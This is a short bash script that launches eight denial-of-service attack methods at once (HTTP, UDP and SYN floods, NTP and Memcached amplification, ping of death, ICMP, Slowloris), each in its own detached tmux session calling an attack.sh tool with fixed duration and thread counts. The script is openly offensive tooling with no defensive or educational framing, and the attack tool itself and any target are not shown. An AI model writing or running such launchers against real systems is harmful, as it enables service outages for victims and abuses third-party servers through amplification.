#!/usr/bin/env bash

attacks=("HTTP" "UDP" "NTP" "SYN" "POD" "ICMP" "Slowloris" "Memcached")

for attack in ${attacks[@]}; do
  tmux kill-session -t "${attack}" 2>/dev/null
  tmux new-session -d -s "${attack}" "./attack.sh --method ${attack} --time 50 --threads 20"
done
